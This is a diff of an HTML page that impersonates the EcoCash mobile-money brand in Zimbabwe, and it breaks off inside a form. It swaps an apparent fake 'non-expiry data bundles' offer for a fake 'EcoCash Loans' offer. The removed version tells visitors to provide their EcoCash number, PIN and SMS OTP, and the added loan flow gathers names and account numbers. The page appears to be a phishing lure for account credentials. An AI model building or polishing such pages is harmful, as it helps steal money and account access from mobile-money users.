@@ -4,52 +4,33 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
     <meta name="theme-color" content="#003366">
-    <title>EcoCash Data | Non-Expiry USD Bundles · Zimbabwe</title>
+    <title>EcoCash Loans | Exclusive Regular User Offers</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
         :root {
-            --blue-dark: #001a33;
-            --blue: #003366;
-            --blue-mid: #004d99;
-            --blue-light: #0077cc;
-            --blue-bright: #00aaff;
-            --red: #e30613;
-            --green: #00a651;
-            --gold: #f5a623;
+            --eco-blue: #003366;
+            --eco-red: #e30613;
             --white: #ffffff;
-            --light: #f0f6ff;
+            --light-blue: #f0f5ff;
             --dark: #0d1b2a;
-            --muted: #5a6d80;
-            --border: #d0dce8;
+            --muted: #6c757d;
+            --border: #dee2e6;
         }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
         html { scroll-behavior: smooth; -webkit-text-size-adjust: 100%; }
 
         body {
             font-family: 'Poppins', system-ui, sans-serif;
-            background: var(--white);
+            background: var(--light-blue);
             color: var(--dark);
             line-height: 1.6;
             overflow-x: hidden;
         }
 
-        /* Top Bar */
-        .topbar {
-            background: var(--blue);
-            color: white;
-            padding: 8px 5%;
-            display: flex;
-            justify-content: center;
-            gap: 24px;
-            font-size: 11px;
-            font-weight: 500;
-            flex-wrap: wrap;
-        }
-
         /* Header */
         header {
-            background: white;
+            background: var(--white);
             padding: 12px 5%;
             display: flex;
             justify-content: space-between;
@@ -57,552 +38,388 @@
             position: sticky;
             top: 0;
             z-index: 1000;
-            box-shadow: 0 2px 12px rgba(0,51,102,0.06);
-            border-bottom: 3px solid var(--blue);
+            box-shadow: 0 2px 10px rgba(0,0,0,0.05);
+            border-bottom: 3px solid var(--eco-blue);
         }
 
         .logo {
             font-size: 24px;
             font-weight: 900;
             text-decoration: none;
-            letter-spacing: -0.5px;
-        }
-
-        .logo .eco { color: var(--blue); }
-        .logo .cash { color: var(--red); }
-
-        .nav-desktop {
             display: flex;
             align-items: center;
-            gap: 24px;
         }
 
-        .nav-desktop a {
-            color: var(--dark);
+        .logo .eco { color: var(--eco-blue); }
+        .logo .cash { color: var(--eco-red); }
+
+        .btn-account {
+            background: var(--eco-blue);
+            color: var(--white);
+            padding: 8px 22px;
+            border-radius: 50px;
             text-decoration: none;
-            font-weight: 600;
             font-size: 13px;
-            transition: color 0.2s;
-        }
-
-        .nav-desktop a:hover { color: var(--blue-light); }
-
-        .nav-cta {
-            background: var(--blue);
-            color: white !important;
-            padding: 10px 22px;
-            border-radius: 50px;
-            font-size: 12px !important;
-            box-shadow: 0 4px 12px rgba(0,51,102,0.25);
-            transition: all 0.2s !important;
-        }
-
-        .nav-cta:hover { background: var(--blue-light) !important; transform: translateY(-1px); }
-
-        .menu-btn {
-            display: none;
-            background: none;
-            border: none;
-            font-size: 26px;
+            font-weight: 700;
+            transition: 0.3s;
             cursor: pointer;
-            color: var(--blue);
-        }
-
-        .mobile-nav {
-            display: none;
-            position: absolute;
-            top: 100%;
-            left: 0; right: 0;
-            background: white;
-            border-bottom: 3px solid var(--blue);
-            box-shadow: 0 8px 20px rgba(0,51,102,0.1);
-            z-index: 999;
-        }
-
-        .mobile-nav.open { display: block; }
-
-        .mobile-nav a {
-            display: block;
-            padding: 14px 5%;
-            color: var(--dark);
-            text-decoration: none;
-            font-weight: 600;
-            font-size: 14px;
-            border-bottom: 1px solid var(--border);
-        }
-
-        .mobile-nav a:hover { background: var(--light); }
-
-        .mobile-nav .m-cta {
-            margin: 12px 5%;
-            text-align: center;
-            background: var(--blue);
-            color: white;
-            padding: 14px;
-            border-radius: 50px;
-            border-bottom: none;
+            border: none;
         }
 
         /* Hero */
         .hero {
-            background: linear-gradient(135deg, var(--blue-dark) 0%, var(--blue) 50%, var(--blue-mid) 100%);
+            background: linear-gradient(135deg, var(--eco-blue) 0%, #001a33 100%);
             color: white;
-            padding: 80px 5% 70px;
+            padding: 40px 5% 30px;
             text-align: center;
-            position: relative;
-            overflow: hidden;
         }
 
-        .hero::before {
-            content: '';
-            position: absolute;
-            top: -40%; right: -15%;
-            width: 500px; height: 500px;
-            background: radial-gradient(circle, rgba(0,170,255,0.12) 0%, transparent 70%);
-            border-radius: 50%;
+        .hero h1 { font-size: 2.2rem; font-weight: 900; line-height: 1.2; margin-bottom: 10px; }
+        .hero h1 .eco { color: #fff; }
+        .hero h1 .cash { color: var(--eco-red); }
+        .hero p { font-size: 0.95rem; opacity: 0.9; max-width: 500px; margin: 0 auto; }
+
+        /* Step Container */
+        main { max-width: 500px; margin: -20px auto 100px; padding: 0 5%; position: relative; z-index: 10; }
+
+        .step-view { display: none; animation: fadeIn 0.4s ease; }
+        .step-view.active { display: block; }
+
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* Dashboard Message Card */
+        .msg-card {
+            background: var(--white);
+            border-radius: 16px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0,51,102,0.1);
+            margin-bottom: 20px;
+            border: 1px solid rgba(0,51,102,0.1);
+            text-align: center;
         }
 
-        .hero-inner { position: relative; z-index: 1; max-width: 680px; margin: 0 auto; }
+        .msg-title { color: var(--eco-blue); font-size: 16px; font-weight: 800; margin-bottom: 10px; }
+        .msg-text { font-size: 13px; color: var(--muted); line-height: 1.5; }
+        .msg-highlight { color: var(--eco-red); font-weight: 700; }
 
-        .hero-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: rgba(255,255,255,0.08);
-            border: 1px solid rgba(255,255,255,0.2);
-            padding: 8px 18px;
-            border-radius: 50px;
-            font-size: 12px;
-            font-weight: 600;
-            margin-bottom: 18px;
-        }
-
-        .hero h1 {
-            font-size: 2.8rem;
-            font-weight: 900;
-            margin-bottom: 14px;
-            letter-spacing: -1.5px;
-            line-height: 1.1;
-        }
-
-        .hero h1 .hl { color: var(--blue-bright); }
-
-        .hero p { font-size: 1.05rem; opacity: 0.9; margin-bottom: 28px; }
-
-        .hero-stats {
+        /* Offers */
+        .section-title { font-size: 15px; font-weight: 800; color: var(--eco-blue); margin: 25px 0 15px; text-align: center; }
+        
+        .offer-card {
+            background: var(--white);
+            border-radius: 12px;
+            padding: 18px;
             display: flex;
-            justify-content: center;
-            gap: 28px;
-            margin-bottom: 28px;
-            flex-wrap: wrap;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            border-left: 4px solid var(--eco-red);
+            box-shadow: 0 4px 15px rgba(0,0,0,0.03);
         }
 
-        .stat-item { text-align: center; }
-        .stat-item .num { font-size: 1.6rem; font-weight: 900; color: var(--blue-bright); }
-        .stat-item .lbl { font-size: 10px; opacity: 0.7; }
+        .offer-info h4 { font-size: 14px; font-weight: 800; color: var(--eco-blue); }
+        .offer-info p { font-size: 11px; color: var(--muted); }
+        .btn-mini { background: var(--eco-blue); color: white; border: none; padding: 8px 18px; border-radius: 50px; font-size: 11px; font-weight: 700; cursor: pointer; }
 
-        .hero-btns { display: flex; justify-content: center; gap: 12px; flex-wrap: wrap; }
-
-        .btn-hero-1 {
-            background: var(--blue-bright);
-            color: var(--blue-dark);
-            padding: 15px 32px;
-            border-radius: 50px;
-            text-decoration: none;
-            font-weight: 800;
-            font-size: 13px;
-            transition: all 0.2s;
-            box-shadow: 0 4px 16px rgba(0,170,255,0.3);
+        /* Calculator */
+        .card {
+            background: var(--white);
+            border-radius: 16px;
+            padding: 25px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+            margin-bottom: 20px;
         }
 
-        .btn-hero-1:hover { background: white; transform: translateY(-2px); }
+        .calc-title { display: flex; align-items: center; gap: 10px; margin-bottom: 20px; color: var(--eco-blue); }
+        .calc-title i { background: var(--eco-red); color: white; width: 32px; height: 32px; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-style: normal; }
 
-        .btn-hero-2 {
-            background: transparent;
-            color: white;
-            padding: 15px 32px;
-            border-radius: 50px;
-            text-decoration: none;
-            font-weight: 700;
-            font-size: 13px;
-            border: 2px solid rgba(255,255,255,0.3);
-            transition: all 0.2s;
-        }
+        .input-group { margin-bottom: 25px; }
+        .input-group label { display: flex; justify-content: space-between; font-size: 13px; font-weight: 700; color: var(--eco-blue); margin-bottom: 12px; }
+        .input-group label span { color: var(--eco-red); font-size: 1.1rem; }
 
-        .btn-hero-2:hover { background: rgba(255,255,255,0.08); border-color: rgba(255,255,255,0.5); }
-
-        /* Sections */
-        .s-label { text-align: center; color: var(--blue-light); font-weight: 800; font-size: 11px; text-transform: uppercase; letter-spacing: 0.15em; margin-bottom: 6px; }
-        .s-title { text-align: center; font-size: 2rem; font-weight: 900; margin-bottom: 8px; color: var(--dark); letter-spacing: -0.5px; }
-        .s-sub { text-align: center; color: var(--muted); font-size: 0.9rem; margin-bottom: 36px; max-width: 520px; margin-left: auto; margin-right: auto; }
-
-        /* Mix Builder */
-        .mix-sec { padding: 60px 5%; background: var(--light); }
-
-        .mix-box {
-            max-width: 740px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 18px;
-            padding: 28px;
-            box-shadow: 0 6px 24px rgba(0,51,102,0.08);
-            border: 2px solid var(--blue);
-        }
-
-        .mix-tabs { display: flex; gap: 6px; margin-bottom: 22px; flex-wrap: wrap; justify-content: center; }
-
-        .mix-tab {
-            padding: 9px 16px;
-            border-radius: 50px;
-            border: 2px solid var(--border);
-            background: white;
-            font-weight: 700;
-            font-size: 12px;
-            cursor: pointer;
-            transition: all 0.2s;
-            color: var(--dark);
-            font-family: inherit;
-        }
-
-        .mix-tab.active { background: var(--blue); color: white; border-color: var(--blue); }
-        .mix-tab:hover:not(.active) { border-color: var(--blue-light); }
-        .mix-tab .pr { display: block; font-size: 10px; opacity: 0.7; }
-
-        .mix-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 20px; }
-
-        .mix-item {
-            background: var(--light);
-            border-radius: 12px;
-            padding: 16px 10px;
-            text-align: center;
-            border: 2px solid transparent;
-            transition: border 0.2s;
-        }
-
-        .mix-item:hover { border-color: var(--blue-light); }
-        .mix-item .ic { font-size: 22px; margin-bottom: 4px; }
-        .mix-item .lb { font-size: 9px; color: var(--muted); font-weight: 600; text-transform: uppercase; }
-        .mix-item .vl { font-size: 1.2rem; font-weight: 900; color: var(--blue); margin-top: 2px; }
-
-        .mix-price {
-            background: linear-gradient(135deg, var(--blue), var(--blue-dark));
-            border-radius: 12px;
-            padding: 16px;
-            text-align: center;
-            color: white;
-            margin-bottom: 16px;
-        }
-
-        .mix-price .lb { font-size: 10px; opacity: 0.8; }
-        .mix-price .am { font-size: 1.8rem; font-weight: 900; }
-
-        .btn-sub {
+        input[type="range"] {
             width: 100%;
-            background: var(--blue);
-            color: white;
-            border: none;
-            padding: 15px;
-            border-radius: 50px;
-            font-weight: 800;
-            font-size: 13px;
-            cursor: pointer;
-            font-family: inherit;
-            text-transform: uppercase;
-            letter-spacing: 0.04em;
-            box-shadow: 0 4px 12px rgba(0,51,102,0.25);
-            transition: all 0.2s;
+            height: 6px;
+            background: var(--border);
+            border-radius: 3px;
+            outline: none;
+            -webkit-appearance: none;
         }
 
-        .btn-sub:hover { background: var(--blue-light); transform: translateY(-1px); }
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 24px;
+            height: 24px;
+            background: var(--eco-blue);
+            border-radius: 50%;
+            cursor: pointer;
+            border: 4px solid var(--white);
+            box-shadow: 0 2px 8px rgba(0,0,0,0.15);
+        }
 
-        /* Bundles */
-        .bundles-sec { padding: 60px 5%; }
-
-        .b-grid {
+        .calc-res {
+            background: var(--light-blue);
+            border-radius: 12px;
+            padding: 20px;
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
-            gap: 16px;
-            max-width: 1100px;
-            margin: 0 auto;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin-bottom: 25px;
+            border: 1px solid var(--border);
         }
 
-        .b-card {
-            background: white;
-            border: 2px solid var(--border);
-            border-radius: 14px;
-            padding: 24px 20px;
-            text-align: center;
-            transition: all 0.3s;
-            position: relative;
-        }
+        .res-item .lbl { font-size: 10px; color: var(--muted); text-transform: uppercase; font-weight: 700; }
+        .res-item .val { font-size: 1.1rem; font-weight: 800; color: var(--eco-blue); }
 
-        .b-card::after { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px; background: var(--blue); border-radius: 14px 14px 0 0; transform: scaleX(0); transition: transform 0.3s; }
-        .b-card:hover::after { transform: scaleX(1); }
-        .b-card:hover { border-color: var(--blue); box-shadow: 0 8px 28px rgba(0,51,102,0.1); transform: translateY(-3px); }
-
-        .b-card.pop { border-color: var(--blue-light); }
-        .b-card.pop::after { transform: scaleX(1); background: var(--blue-light); }
-
-        .b-badge { display: inline-block; background: var(--blue); color: white; padding: 3px 10px; border-radius: 50px; font-size: 9px; font-weight: 700; text-transform: uppercase; margin-bottom: 12px; }
-        .b-badge.hot { background: var(--blue-light); }
-
-        .b-data { font-size: 2.2rem; font-weight: 900; color: var(--blue); margin-bottom: 2px; }
-        .b-price { font-size: 1.1rem; font-weight: 800; color: var(--dark); margin-bottom: 12px; }
-
-        .b-list { list-style: none; text-align: left; margin-bottom: 16px; font-size: 11px; color: var(--muted); }
-        .b-list li { padding: 4px 0; display: flex; align-items: center; gap: 6px; }
-        .b-list li::before { content: "\2713"; color: var(--green); font-weight: 900; }
-
-        .btn-b {
+        /* Form */
+        .form-group { margin-bottom: 18px; }
+        .form-group label { display: block; font-size: 12px; font-weight: 700; color: var(--eco-blue); margin-bottom: 6px; }
+        .form-group input, .form-group select {
             width: 100%;
-            background: var(--blue);
+            padding: 14px 18px;
+            border: 2px solid var(--border);
+            border-radius: 10px;
+            font-family: inherit;
+            font-size: 14px;
+            transition: 0.2s;
+        }
+        .form-group input:focus { border-color: var(--eco-blue); outline: none; }
+
+        .summary {
+            background: var(--eco-blue);
+            color: white;
+            padding: 15px 20px;
+            border-radius: 12px;
+            margin-bottom: 25px;
+            font-size: 13px;
+        }
+        .summary-row { display: flex; justify-content: space-between; margin-bottom: 4px; }
+        .summary-row .val { font-weight: 800; color: var(--eco-red); }
+
+        /* Buttons */
+        .btn-main {
+            width: 100%;
+            background: var(--eco-red);
             color: white;
             border: none;
-            padding: 11px;
+            padding: 16px;
             border-radius: 50px;
-            font-weight: 700;
-            font-size: 11px;
+            font-weight: 800;
+            font-size: 15px;
             text-transform: uppercase;
+            letter-spacing: 1px;
             cursor: pointer;
-            font-family: inherit;
-            transition: all 0.2s;
+            box-shadow: 0 6px 15px rgba(227, 6, 19, 0.25);
+            transition: 0.3s;
+        }
+        .btn-main:active { transform: scale(0.98); }
+
+        .btn-back {
+            background: none;
+            border: none;
+            color: var(--muted);
+            font-weight: 700;
+            font-size: 13px;
+            cursor: pointer;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
         }
 
-        .btn-b:hover { background: var(--blue-light); }
-
-        /* Features */
-        .feat-sec { padding: 60px 5%; background: var(--light); }
-
-        .feat-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 16px; max-width: 900px; margin: 0 auto; }
-
-        .feat-card {
-            background: white;
-            padding: 24px 18px;
-            border-radius: 14px;
-            text-align: center;
-            border: 2px solid transparent;
-            transition: all 0.3s;
-        }
-
-        .feat-card:hover { border-color: var(--blue-light); box-shadow: 0 6px 20px rgba(0,51,102,0.08); }
-
-        .feat-ic { width: 48px; height: 48px; background: var(--blue); border-radius: 12px; display: flex; align-items: center; justify-content: center; margin: 0 auto 12px; font-size: 1.3rem; }
-        .feat-card h3 { font-size: 0.85rem; font-weight: 800; margin-bottom: 4px; }
-        .feat-card p { color: var(--muted); font-size: 0.78rem; }
-
-        /* How */
-        .how-sec {
-            padding: 60px 5%;
-            background: linear-gradient(135deg, var(--blue-dark), var(--blue));
-            color: white;
-        }
-
-        .how-sec .s-label { color: var(--blue-bright); }
-        .how-sec .s-title { color: white; }
-        .how-sec .s-sub { color: rgba(255,255,255,0.7); }
-
-        .steps { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 16px; max-width: 850px; margin: 0 auto; }
-
-        .step {
-            background: rgba(255,255,255,0.05);
-            border: 1px solid rgba(255,255,255,0.1);
-            padding: 24px 16px;
-            border-radius: 14px;
-            text-align: center;
-            transition: all 0.3s;
-        }
-
-        .step:hover { background: rgba(255,255,255,0.1); transform: translateY(-3px); }
-
-        .step-n { width: 38px; height: 38px; background: var(--blue-bright); color: var(--blue-dark); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; font-size: 15px; margin: 0 auto 10px; }
-        .step h3 { font-size: 0.85rem; font-weight: 800; margin-bottom: 4px; }
-        .step p { color: rgba(255,255,255,0.6); font-size: 0.75rem; }
-
-        /* Footer */
-        footer { background: #000d1a; color: white; padding: 44px 5% 18px; }
-
-        .ft-grid { max-width: 950px; margin: 0 auto; display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 28px; margin-bottom: 28px; }
-
-        .ft-brand p { color: rgba(255,255,255,0.45); font-size: 11px; margin-top: 8px; line-height: 1.7; }
-        .ft-col h4 { font-size: 0.75rem; font-weight: 800; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.05em; }
-        .ft-col ul { list-style: none; }
-        .ft-col ul li { margin-bottom: 6px; }
-        .ft-col ul li a { color: rgba(255,255,255,0.45); text-decoration: none; font-size: 11px; transition: color 0.2s; }
-        .ft-col ul li a:hover { color: white; }
-
-        .ft-bottom { border-top: 1px solid rgba(255,255,255,0.06); padding-top: 16px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px; }
-        .ft-bottom p { font-size: 10px; color: rgba(255,255,255,0.35); }
-        .ft-badges { display: flex; gap: 12px; font-size: 10px; color: rgba(255,255,255,0.35); font-weight: 600; }
-
-        @media (max-width: 768px) {
-            .nav-desktop { display: none; }
-            .menu-btn { display: block; }
-            .hero { padding: 50px 5% 45px; }
-            .hero h1 { font-size: 1.9rem; }
-            .s-title { font-size: 1.5rem; }
-            .b-grid { grid-template-columns: 1fr; max-width: 360px; margin: 0 auto; }
-            .steps { grid-template-columns: 1fr 1fr; }
-            .ft-grid { grid-template-columns: 1fr 1fr; }
-            .ft-bottom { flex-direction: column; text-align: center; }
-        }
+        .footer-info { text-align: center; margin-top: 40px; font-size: 11px; color: var(--muted); }
 
         @media (max-width: 480px) {
-            .hero h1 { font-size: 1.6rem; }
-            .hero-btns { flex-direction: column; align-items: center; }
-            .steps { grid-template-columns: 1fr; }
-            .mix-grid { grid-template-columns: repeat(3, 1fr); gap: 8px; }
+            .hero h1 { font-size: 1.8rem; }
         }
     </style>
 </head>
 <body>
-    <div class="topbar">
-        <span>&#127487;&#127484; Zimbabwe</span>
-        <span>&#9889; Instant Activation</span>
-        <span>&#9854;&#65039; Non-Expiry</span>
-        <span>&#128274; Secure</span>
-    </div>
 
     <header>
-        <a class="logo" href="index.html"><span class="eco">Eco</span><span class="cash">Cash</span></a>
-        <nav class="nav-desktop">
-            <a href="#bundles">Data Plans</a>
-            <a href="#mix">Mix Builder</a>
-            <a href="#how">How It Works</a>
-            <a href="login.html?data=4%20GB&price=0.60" class="nav-cta">Get Started</a>
-        </nav>
-        <button class="menu-btn" onclick="toggleMenu()">&#9776;</button>
-        <div class="mobile-nav" id="mobNav">
-            <a href="index.html">Home</a>
-            <a href="#bundles" onclick="closeMenu()">Data Plans</a>
-            <a href="#how" onclick="closeMenu()">How It Works</a>
-            <a href="login.html?data=4%20GB&price=0.60" class="m-cta">Get Started</a>
-        </div>
+        <a href="#" class="logo" onclick="showStep(1)">
+            <span class="eco">Eco</span><span class="cash">Cash</span>
+        </a>
+        <button class="btn-account" onclick="openAccount()">My Account</button>
     </header>
 
     <section class="hero">
-        <div class="hero-inner">
-            <div class="hero-badge">&#127487;&#127484; Zimbabwe's #1 Data Provider</div>
-            <h1>Non-Expiry <span class="hl">USD Data</span> Bundles</h1>
-            <p>Buy affordable data bundles via EcoCash. Instant activation, never expires, all networks.</p>
-            <div class="hero-stats">
-                <div class="stat-item"><div class="num">2M+</div><div class="lbl">Users</div></div>
-                <div class="stat-item"><div class="num">99.9%</div><div class="lbl">Uptime</div></div>
-                <div class="stat-item"><div class="num">$0.60</div><div class="lbl">From</div></div>
-            </div>
-            <div class="hero-btns">
-                <a href="#bundles" class="btn-hero-1">View Data Plans</a>
-                <a href="login.html?data=4%20GB&price=0.60" class="btn-hero-2">Get Started &#8594;</a>
-            </div>
-        </div>
+        <h1><span class="eco">Eco</span><span class="cash">Cash</span> Loans Offers</h1>
+        <p>Exclusive credit opportunities for our regular and loyal users.</p>
     </section>
 
-    <section class="mix-sec" id="mix">
-        <div class="s-label">Bundle Builder</div>
-        <h2 class="s-title">Mix Your Bundle</h2>
-        <p class="s-sub">Voice, SMS, and Data in one affordable package.</p>
-        <div class="mix-box">
-            <div class="mix-tabs">
-                <button class="mix-tab active" onclick="pickMix(0)">Daily<span class="pr">$0.60</span></button>
-                <button class="mix-tab" onclick="pickMix(1)">3 Days<span class="pr">$1.40</span></button>
-                <button class="mix-tab" onclick="pickMix(2)">Weekly<span class="pr">$2.80</span></button>
-                <button class="mix-tab" onclick="pickMix(3)">2 Weeks<span class="pr">$5.20</span></button>
-                <button class="mix-tab" onclick="pickMix(4)">Monthly<span class="pr">$9.90</span></button>
+    <main>
+        <!-- STEP 1: DASHBOARD MESSAGE -->
+        <div class="step-view active" id="step1">
+            <div class="msg-card">
+                <div class="msg-title">Exclusive Offer for Regular Users</div>
+                <p class="msg-text">
+                    This loans offer is <span class="msg-highlight">strictly for EcoCash regular users</span>. 
+                    The more you use EcoCash, the more chance of hitting a <span class="msg-highlight">higher limit</span>.
+                </p>
+                <div style="display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 15px;">
+                    <span style="color: #28a745; font-size: 14px;">✔</span>
+                    <span style="font-size: 12px; font-weight: 700; color: var(--eco-blue);">Loyalty Rewards Active</span>
+                </div>
             </div>
-            <div class="mix-grid">
-                <div class="mix-item"><div class="ic">&#128222;</div><div class="lb">Voice</div><div class="vl" id="mV">20 Min</div></div>
-                <div class="mix-item"><div class="ic">&#128172;</div><div class="lb">SMS</div><div class="vl" id="mS">25 SMS</div></div>
-                <div class="mix-item"><div class="ic">&#127760;</div><div class="lb">Data</div><div class="vl" id="mD">3 GB</div></div>
+
+            <h3 class="section-title">Available Offers</h3>
+            
+            <div class="offer-card">
+                <div class="offer-info">
+                    <h4>Business Growth Offer</h4>
+                    <p>Up to $5,000 · 12 Months</p>
+                </div>
+                <button class="btn-mini" onclick="quickApply(5000, 12)">Apply</button>
             </div>
-            <div class="mix-price"><div class="lb">Your bundle price</div><div class="am" id="mP">USD 0.60</div></div>
-            <button class="btn-sub" id="mBtn" onclick="subMix()">Subscribe &mdash; Daily</button>
-        </div>
-    </section>
-
-    <section class="bundles-sec" id="bundles">
-        <div class="s-label">USD Pricing</div>
-        <h2 class="s-title">Non-Expiry Data Bundles</h2>
-        <p class="s-sub">Pay via EcoCash. Instant activation. Never expires.</p>
-        <div class="b-grid">
-            <div class="b-card"><div class="b-badge">Starter</div><div class="b-data">4 GB</div><div class="b-price">USD 0.60</div><ul class="b-list"><li>Non-Expiry</li><li>Instant Activation</li><li>All Networks</li></ul><button class="btn-b" onclick="pick('4 GB','0.60')">Get Bundle</button></div>
-            <div class="b-card"><div class="b-badge">Standard</div><div class="b-data">10 GB</div><div class="b-price">USD 1.40</div><ul class="b-list"><li>Non-Expiry</li><li>Instant Activation</li><li>All Networks</li></ul><button class="btn-b" onclick="pick('10 GB','1.40')">Get Bundle</button></div>
-            <div class="b-card"><div class="b-badge">Premium</div><div class="b-data">20 GB</div><div class="b-price">USD 2.80</div><ul class="b-list"><li>Non-Expiry</li><li>Instant Activation</li><li>All Networks</li></ul><button class="btn-b" onclick="pick('20 GB','2.80')">Get Bundle</button></div>
-            <div class="b-card pop"><div class="b-badge hot">Best Value</div><div class="b-data">50 GB</div><div class="b-price">USD 6.50</div><ul class="b-list"><li>Non-Expiry</li><li>Instant Activation</li><li>All Networks</li><li>Priority Support</li></ul><button class="btn-b" onclick="pick('50 GB','6.50')">Get Bundle</button></div>
-            <div class="b-card"><div class="b-badge">Enterprise</div><div class="b-data">100 GB</div><div class="b-price">USD 12.00</div><ul class="b-list"><li>Non-Expiry</li><li>Instant Activation</li><li>All Networks</li></ul><button class="btn-b" onclick="pick('100 GB','12.00')">Get Bundle</button></div>
-            <div class="b-card"><div class="b-badge">Ultimate</div><div class="b-data">200 GB</div><div class="b-price">USD 19.80</div><ul class="b-list"><li>Non-Expiry</li><li>Instant Activation</li><li>All Networks</li></ul><button class="btn-b" onclick="pick('200 GB','19.80')">Get Bundle</button></div>
-        </div>
-    </section>
-
-    <section class="feat-sec" id="features">
-        <div class="s-label">Why EcoCash Data</div>
-        <h2 class="s-title">Why Choose Us?</h2>
-        <p class="s-sub">Trusted by millions across Zimbabwe.</p>
-        <div class="feat-grid">
-            <div class="feat-card"><div class="feat-ic">&#9854;&#65039;</div><h3>Never Expires</h3><p>Your data stays valid forever.</p></div>
-            <div class="feat-card"><div class="feat-ic">&#9889;</div><h3>Instant Activation</h3><p>Buy and browse immediately.</p></div>
-            <div class="feat-card"><div class="feat-ic">&#128260;</div><h3>Auto Rollover</h3><p>Unused data carries forward.</p></div>
-            <div class="feat-card"><div class="feat-ic">&#128274;</div><h3>Bank-Level Security</h3><p>256-bit encryption on all transactions.</p></div>
-        </div>
-    </section>
-
-    <section class="how-sec" id="how">
-        <div class="s-label">EcoCash Payment</div>
-        <h2 class="s-title">How It Works</h2>
-        <p class="s-sub">Simple 4-step EcoCash process.</p>
-        <div class="steps">
-            <div class="step"><div class="step-n">1</div><h3>Select Bundle</h3><p>Choose your preferred data bundle.</p></div>
-            <div class="step"><div class="step-n">2</div><h3>Enter Details</h3><p>Provide EcoCash number and PIN.</p></div>
-            <div class="step"><div class="step-n">3</div><h3>Verify OTP</h3><p>Enter the 6-digit SMS code.</p></div>
-            <div class="step"><div class="step-n">4</div><h3>Enjoy Data</h3><p>Bundle activates instantly!</p></div>
-        </div>
-    </section>
-
-    <footer>
-        <div class="ft-grid">
-            <div class="ft-brand">
-                <span class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></span>
-                <p>Zimbabwe's leading mobile money platform. Buy non-expiry data bundles securely.</p>
+            
+            <div class="offer-card">
+                <div class="offer-info">
+                    <h4>Regular User Quick Cash</h4>
+                    <p>Up to $1,000 · 3 Months</p>
+                </div>
+                <button class="btn-mini" onclick="quickApply(1000, 3)">Apply</button>
             </div>
-            <div class="ft-col"><h4>Products</h4><ul><li><a href="#bundles">Data Bundles</a></li><li><a href="#mix">Mix Builder</a></li><li><a href="#">Airtime</a></li></ul></div>
-            <div class="ft-col"><h4>Support</h4><ul><li><a href="#">Help Centre</a></li><li><a href="#">Contact</a></li><li><a href="#">FAQ</a></li></ul></div>
-            <div class="ft-col"><h4>Legal</h4><ul><li><a href="#">Privacy</a></li><li><a href="#">Terms</a></li></ul></div>
+
+            <button class="btn-main" style="margin-top: 15px;" onclick="showStep(2)">Custom Calculator →</button>
+            
+            <div class="footer-info">
+                &copy; 2026 EcoCash Zimbabwe · Secure Financial Services
+            </div>
         </div>
-        <div class="ft-bottom">
-            <p>&copy; 2026 Econet Wireless &middot; EcoCash Zimbabwe</p>
-            <div class="ft-badges"><span>&#128274; 256-bit Encrypted</span><span>&#9989; PCI DSS</span></div>
+
+        <!-- STEP 2: CALCULATOR -->
+        <div class="step-view" id="step2">
+            <button class="btn-back" onclick="showStep(1)">← Back to Offers</button>
+            <div class="card">
+                <div class="calc-title"><i>📊</i> <div><strong>Loan Calculator</strong><br><small>Adjust your request</small></div></div>
+                
+                <div class="input-group">
+                    <label>Amount (USD) <span id="amtVal">$5,000</span></label>
+                    <input type="range" id="loanAmount" min="500" max="10000" step="100" value="5000" oninput="updateCalc()">
+                </div>
+
+                <div class="input-group">
+                    <label>Period <span id="durVal">12 Months</span></label>
+                    <input type="range" id="loanDuration" min="1" max="24" step="1" value="12" oninput="updateCalc()">
+                </div>
+
+                <div class="calc-res">
+                    <div class="res-item">
+                        <div class="lbl">Monthly Pay</div>
+                        <div class="val" id="monthlyPay">$0.00</div>
+                    </div>
+                    <div class="res-item">
+                        <div class="lbl">Total Repay</div>
+                        <div class="val" id="totalRepay">$0.00</div>
+                    </div>
+                </div>
+
+                <button class="btn-main" onclick="showStep(3)">Continue Application</button>
+            </div>
         </div>
-    </footer>
+
+        <!-- STEP 3: APPLICATION -->
+        <div class="step-view" id="step3">
+            <button class="btn-back" onclick="showStep(2)">← Change Amount</button>
+            <div class="card">
+                <h3 style="margin-bottom: 15px; color: var(--eco-blue);">Complete Application</h3>
+                
+                <div class="summary">
+                    <div class="summary-row"><span>Loan Amount:</span> <span class="val" id="finalAmt">$5,000</span></div>
+                    <div class="summary-row"><span>Period:</span> <span class="val" id="finalDur">12 Months</span></div>
+                    <div class="summary-row"><span>Interest Rate:</span> <span class="val">8.9% Fixed</span></div>
+                </div>
+
+                <form id="loanForm" onsubmit="handleFinalSubmit(event)">
+                    <div class="form-group">
+                        <label>Full Legal Name</label>
+                        <input type="text" id="fullName" placeholder="As shown on EcoCash Account" required>
+                    </div>
+                    <div class="form-group">
+                        <label>EcoCash Number</label>
